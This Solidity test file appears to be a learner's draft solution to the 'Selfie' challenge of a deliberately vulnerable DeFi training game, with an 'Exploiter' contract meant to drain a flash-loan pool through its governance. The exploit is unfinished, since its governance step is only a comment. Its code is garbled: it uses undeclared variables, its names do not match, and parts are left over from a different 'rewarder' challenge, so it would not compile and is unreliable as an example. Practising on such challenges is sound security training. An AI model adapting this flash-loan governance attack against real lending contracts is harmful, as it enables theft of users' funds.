// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import {TestWithUsers}              from "../TestWithUsers.sol";

// Import contracts in question
import {SelfiePool}                 from "../selfie/SelfiePool.sol";
import {SimpleGovernance}           from "../selfie/SimpleGovernance.sol";
import {DamnValuableTokenSnapshot}  from "../DamnValuableTokenSnapshot.sol";
import "../DamnValuableToken.sol";


/**
    @notice Challenge #6 - Selfie

    @dev A new cool lending pool has launched! It's now offering flash loans of DVT 
    tokens. Wow, and it even includes a really fancy governance mechanism to control 
    it. What could go wrong, right ? You start with no DVT tokens in balance, and the 
    pool has 1.5 million. Your objective: take them all.
*/
contract SelfieTest is TestWithUsers {

    uint256 TOKEN_INITIAL_SUPPLY = 2_000_000 ether; // 2 million tokens
    uint256 TOKENS_IN_POOL = 1_500_000 ether;       // 1.5 million tokens
    
    SelfiePool pool;
    SimpleGovernance governance;   
    DamnValuableTokenSnapshot damnValueableToken;

    User attacker;

    function setUp() public {

        // Setup test user/users
        User[] memory users = getSigners(1);
        attacker = users[0];

        // Deploy test contracts
        token = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);
        governance = new SimpleGovernance(address(token));
        pool = new SelfiePool(address(token), address(governance));

        // Give the pool 1.5m tokens
        token.transfer(address(pool), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
    }
    function successConditions() internal {
        // Attacker has taken all tokens from the pool
        assertEq(token.balanceOf(attacker.account), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }

    Exploiter exploiter;

    function testRewarderExploit() public {
        exploiter = new Exploiter(
            token,
            governance,
            damnValuableToken,
            pool,
            attacker.account
        );

        vm.startPrank(attacker.account);
        exploiter.bad();


        // VVV (DO NOT TOUCH THIS LINE) VVV
        successConditions(); 
    }
}

contract Exploiter {

    DamnValuableTokenSnapshot token;
    SimpleGovernance governance;
    SelfiePool selfiePool;
    address badGuy;

    constructor(
        ERC20Snapshot _token,
        SimpleGovernance _governance, 
        DamnValuableTokenSnapshot _liquidityToken,
        SelfiePool _pool,
        address attacker
    ) public {
        erc20Snapshot = _token;
        simpleGovernance = _governance;
        damnValuableToken = _liquidityToken;
        pool = _pool;
        badGuy = attacker;
        damnValuableToken.approve(address(simpleGovernance), type(uint256).max);
    }

    function bad() public {
        pool.flashLoan(1_500_000 ether);
    }

    function receiveTokens(address damnValuableToken, uint256 amount) public {
        // attacker has enough, to queue an action
        // governance.queueAction(address(this), )
        // attacker queues action in governance contract
        rewardToken.transfer(badGuy, rewardToken.balanceOf(address(this)));
        liquidityToken.transfer(msg.sender, amount);
    }
}